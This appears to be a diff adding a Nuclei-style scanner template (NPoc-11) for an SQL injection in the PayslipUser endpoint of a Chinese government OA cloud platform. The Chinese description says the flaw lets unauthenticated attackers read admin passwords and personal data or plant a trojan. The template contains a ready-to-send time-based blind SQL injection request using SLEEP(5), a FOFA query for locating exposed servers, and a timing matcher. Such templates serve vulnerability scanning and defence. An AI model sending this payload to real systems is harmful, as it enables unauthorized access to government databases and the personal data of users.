@@ -1,0 +1,27 @@
+id: NPoc-11
+
+info:
+  name: 数字通指尖云平台-智慧政务payslip SQL注入漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    数字通云平台 智慧政务OA PayslipUser 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+  metadata:
+    verified: false
+    max-request: 1
+    fofa-query: body="assets/8cca19ff/css/bootstrap-yii.css"
+  tags: SQL注入,数字通,智慧政务
+request:
+  - raw:
+      - |
+        GET /payslip/search/index/userid/time/time?PayslipUser[user_id]=%28SELECT+4655+FROM+%28SELECT%28SLEEP%285%29%29%29usQE%29 HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+    matchers-condition: and
+    matchers:
+      - type: duration
+        part: duration
+        duration: 5
